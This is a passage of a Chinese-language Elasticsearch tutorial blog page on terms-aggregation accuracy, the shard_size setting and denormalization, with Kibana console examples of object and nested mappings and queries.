alt="26"></p><h3 id="Min-聚合分析的执行流程"><a href="#Min-聚合分析的执行流程" class="headerlink" title="Min 聚合分析的执行流程"></a>Min 聚合分析的执行流程</h3><p><img src="/images/big-data/es-06/28.jpg" alt="28"></p><h3 id="Terms-Aggregation-的返回值"><a href="#Terms-Aggregation-的返回值" class="headerlink" title="Terms Aggregation 的返回值"></a>Terms Aggregation 的返回值</h3><ul><li>在 Terms Aggregation 的返回中有两个特殊的数值<ul><li>doc_count_error_upper_bound：被遗漏的 term 分桶，包含的文档，有可能的最大值</li><li>sum_other_doc_count: 除了返回结果 bucket 的 terms 以外，其他 terms 的文档总数（总数 - 返回的总数）</li></ul></li></ul><p><img src="/images/big-data/es-06/29.jpg" alt="29"></p><h3 id="Terms-聚合分析的执行流程"><a href="#Terms-聚合分析的执行流程" class="headerlink" title="Terms 聚合分析的执行流程"></a>Terms 聚合分析的执行流程</h3><p><img src="/images/big-data/es-06/30.jpg" alt="30"></p><h3 id="Terms-不正确的案例"><a href="#Terms-不正确的案例" class="headerlink" title="Terms 不正确的案例"></a>Terms 不正确的案例</h3><p><img src="/images/big-data/es-06/31.jpg" alt="31"></p><h3 id="如何解决-Terms-不准的问题：提升-shard-size-的参数"><a href="#如何解决-Terms-不准的问题：提升-shard-size-的参数" class="headerlink" title="如何解决 Terms 不准的问题：提升 shard_size 的参数"></a>如何解决 Terms 不准的问题：提升 shard_size 的参数</h3><ul><li>Terms 聚合分析不准的原因，数据分散在多个分片上，Coordinating Node 无法获取数据全貌</li><li>解决方案 1：当数据量不大时，设置 Primary Shard 为 1；实现准确性</li><li>解决方案 2：在分布式数据上，设置 shard_size 参数，提高精确度<ul><li>原理：每次从 Shard 上额外多获取数据，提升准确率</li></ul></li></ul><p><img src="/images/big-data/es-06/32.jpg" alt="32"></p><h3 id="打开-show-term-doc-count-error"><a href="#打开-show-term-doc-count-error" class="headerlink" title="打开 show_term_doc_count_error"></a>打开 show_term_doc_count_error</h3><p><img src="/images/big-data/es-06/33.jpg" alt="33"></p><h3 id="shard-size-设定"><a href="#shard-size-设定" class="headerlink" title="shard_size 设定"></a>shard_size 设定</h3><ul><li>调整 shard size 大小，降低 doc_count_error_upper_bound 来提升准确度<ul><li>增加整体计算量，提高了准确率，但会降低相应时间</li></ul></li><li>Shard Size 默认大小设定<ul><li>shard size = size * 1.5 +10</li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.2/search-aggregations-bucket-terms-aggregation.html#search-aggregations-bucket-terms-aggregation-approximate-counts" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.2/search-aggregations-bucket-terms-aggregation.html#search-aggregations-bucket-terms-aggregation-approximate-counts</a></li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">DELETE my_flights</span><br><span class="line">PUT my_flights</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"number_of_shards"</span>: <span class="number">20</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"mappings"</span> : &#123;</span><br><span class="line">      <span class="attr">"properties"</span> : &#123;</span><br><span class="line">        <span class="attr">"AvgTicketPrice"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"float"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"Cancelled"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"boolean"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"Carrier"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"Dest"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"DestAirportID"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"DestCityName"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"DestCountry"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"DestLocation"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"geo_point"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"DestRegion"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"DestWeather"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"DistanceKilometers"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"float"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"DistanceMiles"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"float"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"FlightDelay"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"boolean"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"FlightDelayMin"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"integer"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"FlightDelayType"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"FlightNum"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"FlightTimeHour"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"FlightTimeMin"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"float"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"Origin"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"OriginAirportID"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"OriginCityName"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"OriginCountry"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"OriginLocation"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"geo_point"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"OriginRegion"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"OriginWeather"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"dayOfWeek"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"integer"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"timestamp"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"date"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST _reindex</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"source"</span>: &#123;</span><br><span class="line">    <span class="attr">"index"</span>: <span class="string">"kibana_sample_data_flights"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"dest"</span>: &#123;</span><br><span class="line">    <span class="attr">"index"</span>: <span class="string">"my_flights"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET kibana_sample_data_flights/_count</span><br><span class="line">GET my_flights/_count</span><br><span class="line"></span><br><span class="line">get kibana_sample_data_flights/_search</span><br><span class="line"></span><br><span class="line">GET kibana_sample_data_flights/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"weather"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>:<span class="string">"OriginWeather"</span>,</span><br><span class="line">        <span class="attr">"size"</span>:<span class="number">5</span>,</span><br><span class="line">        <span class="attr">"show_term_doc_count_error"</span>:<span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET my_flights/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"weather"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>:<span class="string">"OriginWeather"</span>,</span><br><span class="line">        <span class="attr">"size"</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="attr">"shard_size"</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="attr">"show_term_doc_count_error"</span>:<span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="对象及-Nested-对象"><a href="#对象及-Nested-对象" class="headerlink" title="对象及 Nested 对象"></a>对象及 Nested 对象</h2><h3 id="数据的关联关系"><a href="#数据的关联关系" class="headerlink" title="数据的关联关系"></a>数据的关联关系</h3><ul><li>真实世界中有很多重要的关联关系<ul><li>博客、作者、评论</li><li>银行账户有多次交易记录</li><li>客户有很多银行账户</li><li>目录文件有很多文件和子目录</li></ul></li></ul><h3 id="关系型数据库的范式化设计"><a href="#关系型数据库的范式化设计" class="headerlink" title="关系型数据库的范式化设计"></a>关系型数据库的范式化设计</h3><ul><li>范式化设计（Normalization）的主要目标是 “减少不必要的更新”</li><li>副作用：一个完全范式化设计的数据库经常面临 “查询缓慢” 的问题<ul><li>数据库越范式化，就需要 Join 越多的表</li></ul></li><li>范式化节省了储存空间，但是储存空间越来越便宜</li><li>范式化简化了更新，但是数据 “读” 取操作可能越多</li></ul><p><img src="/images/big-data/es-06/34.jpg" alt="34"></p><h3 id="Denormalization"><a href="#Denormalization" class="headerlink" title="Denormalization"></a>Denormalization</h3><ul><li>反范式化设计<ul><li>数据 “Flattening”, 不使用关联关系，而是在文档中保存冗余的数据拷贝</li></ul></li><li>优点：无需处理 Joins 操作，数据读取性能好<ul><li>Elasticsearch 通过压缩_source 字段，减少磁盘空间的开销</li></ul></li><li>缺点：不适合在数据频繁修改的场景<ul><li>一条数据（用户名）的改动，可能会引起很多数据的更新</li></ul></li></ul><h3 id="在-Elasticsearch-中处理关联关系"><a href="#在-Elasticsearch-中处理关联关系" class="headerlink" title="在 Elasticsearch 中处理关联关系"></a>在 Elasticsearch 中处理关联关系</h3><ul><li>关系型数据库，一般会考虑 Normalize 数据；在 Elasticsearch，往往考虑 Denormalize 数据<ul><li>Denormalize 的好处：读的速度变快、无需表连接、无需行锁</li></ul></li><li>Elasticsearch 并不擅长处理关联关系，我们一般采用以下四种方法处理关联<ul><li>对象类型</li><li>嵌套对象（Nested Object）</li><li>父子关联关系（Parent / Child）</li><li>应用端关联</li></ul></li></ul><h3 id="案例-1：博客和其作者信息"><a href="#案例-1：博客和其作者信息" class="headerlink" title="案例 1：博客和其作者信息"></a>案例 1：博客和其作者信息</h3><ul><li>对象类型<ul><li>在每个博客的问下中都保留作者的信息</li><li>如果作者信息发生变化，需要修改相关的博客文档</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">DELETE blog</span><br><span class="line"><span class="comment">// 设置blog的 Mapping</span></span><br><span class="line">PUT /blog</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">    <span class="attr">"properties"</span>: &#123;</span><br><span class="line">      <span class="attr">"content"</span>: &#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"text"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"time"</span>: &#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"date"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"user"</span>: &#123;</span><br><span class="line">        <span class="attr">"properties"</span>: &#123;</span><br><span class="line">          <span class="attr">"city"</span>: &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"text"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"userid"</span>: &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"long"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"username"</span>: &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"keyword"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入一条 Blog 信息</span></span><br><span class="line">PUT blog/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"content"</span>:<span class="string">"I like Elasticsearch"</span>,</span><br><span class="line">  <span class="attr">"time"</span>:<span class="string">"2019-01-01T00:00:00"</span>,</span><br><span class="line">  <span class="attr">"user"</span>:&#123;</span><br><span class="line">    <span class="attr">"userid"</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="attr">"username"</span>:<span class="string">"Jack"</span>,</span><br><span class="line">    <span class="attr">"city"</span>:<span class="string">"Shanghai"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过一条查询语句即可获取到博客和作者信息</span></span><br><span class="line"><span class="comment">// 查询 Blog 信息</span></span><br><span class="line">POST blog/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"bool"</span>: &#123;</span><br><span class="line">      <span class="attr">"must"</span>: [</span><br><span class="line">        &#123;<span class="attr">"match"</span>: &#123;<span class="attr">"content"</span>: <span class="string">"Elasticsearch"</span>&#125;&#125;,</span><br><span class="line">        &#123;<span class="attr">"match"</span>: &#123;<span class="attr">"user.username"</span>: <span class="string">"Jack"</span>&#125;&#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="案例-2：包含对象数组的文档"><a href="#案例-2：包含对象数组的文档" class="headerlink" title="案例 2：包含对象数组的文档"></a>案例 2：包含对象数组的文档</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">DELETE my_movies</span><br><span class="line"><span class="comment">// 电影的Mapping信息</span></span><br><span class="line">PUT my_movies</span><br><span class="line">&#123;</span><br><span class="line">      <span class="attr">"mappings"</span> : &#123;</span><br><span class="line">      <span class="attr">"properties"</span> : &#123;</span><br><span class="line">        <span class="attr">"actors"</span> : &#123;</span><br><span class="line">          <span class="attr">"properties"</span> : &#123;</span><br><span class="line">            <span class="attr">"first_name"</span> : &#123;</span><br><span class="line">              <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"last_name"</span> : &#123;</span><br><span class="line">              <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"title"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">          <span class="attr">"fields"</span> : &#123;</span><br><span class="line">            <span class="attr">"keyword"</span> : &#123;</span><br><span class="line">              <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">              <span class="attr">"ignore_above"</span> : <span class="number">256</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写入一条电影信息</span></span><br><span class="line">POST my_movies/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>:<span class="string">"Speed"</span>,</span><br><span class="line">  <span class="attr">"actors"</span>:[</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"first_name"</span>:<span class="string">"Keanu"</span>,</span><br><span class="line">      <span class="attr">"last_name"</span>:<span class="string">"Reeves"</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"first_name"</span>:<span class="string">"Dennis"</span>,</span><br><span class="line">      <span class="attr">"last_name"</span>:<span class="string">"Hopper"</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询电影信息</span></span><br><span class="line">POST my_movies/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"bool"</span>: &#123;</span><br><span class="line">      <span class="attr">"must"</span>: [</span><br><span class="line">        &#123;<span class="attr">"match"</span>: &#123;<span class="attr">"actors.first_name"</span>: <span class="string">"Keanu"</span>&#125;&#125;,</span><br><span class="line">        &#123;<span class="attr">"match"</span>: &#123;<span class="attr">"actors.last_name"</span>: <span class="string">"Hopper"</span>&#125;&#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="为啥会搜到不需要的结果？"><a href="#为啥会搜到不需要的结果？" class="headerlink" title="为啥会搜到不需要的结果？"></a>为啥会搜到不需要的结果？</h3><ul><li>储存时，内部对象的边界没有在考虑在内，JSON 格式被处理成扁平键值对的结构</li><li>当对多个字段进行查询时，导致了意外的搜索结果</li><li>可以用 Nested Data Type 解决这个问题</li></ul><h3 id="Nested-Data-Type"><a href="#Nested-Data-Type" class="headerlink" title="Nested Data Type"></a>Nested Data Type</h3><ul><li>Nested 数据类型：允许对象数组中的对象被独立索引</li><li>使用 nested 和 properties 关键词，将所有 actors 索引到多个分隔的文档</li><li>在内部，Nested 文档会被保存在两个 Lucene 文档中，查询时做 Join 处理</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PUT my_movies</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span> : &#123;</span><br><span class="line">    <span class="attr">"properties"</span> : &#123;</span><br><span class="line">      <span class="attr">"actors"</span> : &#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"nested"</span>,</span><br><span class="line">        <span class="attr">"properties"</span> : &#123;</span><br><span class="line">          <span class="attr">"first_name"</span> : &#123;<span class="attr">"type"</span> : <span class="string">"keyword"</span>&#125;,</span><br><span class="line">          <span class="attr">"last_name"</span> : &#123;<span class="attr">"type"</span> : <span class="string">"keyword"</span>&#125;</span><br><span class="line">        &#125;&#125;,</span><br><span class="line">      <span class="attr">"title"</span> : &#123;</span><br><span class="line">        <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">        <span class="attr">"fields"</span> : &#123;<span class="attr">"keyword"</span>:&#123;<span class="attr">"type"</span>:<span class="string">"keyword"</span>,<span class="attr">"ignore_above"</span>:<span class="number">256</span>&#125;&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="嵌套查询"><a href="#嵌套查询" class="headerlink" title="嵌套查询"></a>嵌套查询</h3><p>在内部，Nested 文档被保存在两个 Lucene 文档中，会在查询时做 Join 处理</p><p><img src="/images/big-data/es-06/35.jpg" alt="35"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Nested 查询</span></span><br><span class="line">POST my_movies/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"bool"</span>: &#123;</span><br><span class="line">      <span class="attr">"must"</span>: [</span><br><span class="line">        &#123;<span class="attr">"match"</span>: &#123;<span class="attr">"title"</span>: <span class="string">"Speed"</span>&#125;&#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"nested"</span>: &#123;</span><br><span class="line">            <span class="attr">"path"</span>: <span class="string">"actors"</span>,</span><br><span class="line">            <span class="attr">"query"</span>: &#123;</span><br><span class="line">              <span class="attr">"bool"</span>: &#123;</span><br><span class="line">                <span class="attr">"must"</span>: [</span><br><span class="line">                  &#123;<span class="attr">"match"</span>: &#123;</span><br><span class="line">                    <span class="attr">"actors.first_name"</span>: <span class="string">"Keanu"</span></span><br><span class="line">                  &#125;&#125;,</span><br><span class="line">                  &#123;<span class="attr">"match"</span>: &#123;</span><br><span class="line">                    <span class="attr">"actors.last_name"</span>: <span class="string">"Hopper"</span></span><br><span class="line">                  &#125;&#125;</span><br><span class="line">                ]</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回</span></span><br><span class="line"> "hits" : &#123;</span><br><span class="line">    "total" : &#123;</span><br><span class="line">      "value" : 0,</span><br><span class="line">      "relation" : "eq"</span><br><span class="line">    &#125;,</span><br><span class="line">    "max_score" : null,</span><br><span class="line">    "hits" : [ ]</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="嵌套聚合"><a href="#嵌套聚合" class="headerlink" title="嵌套聚合"></a>嵌套聚合</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 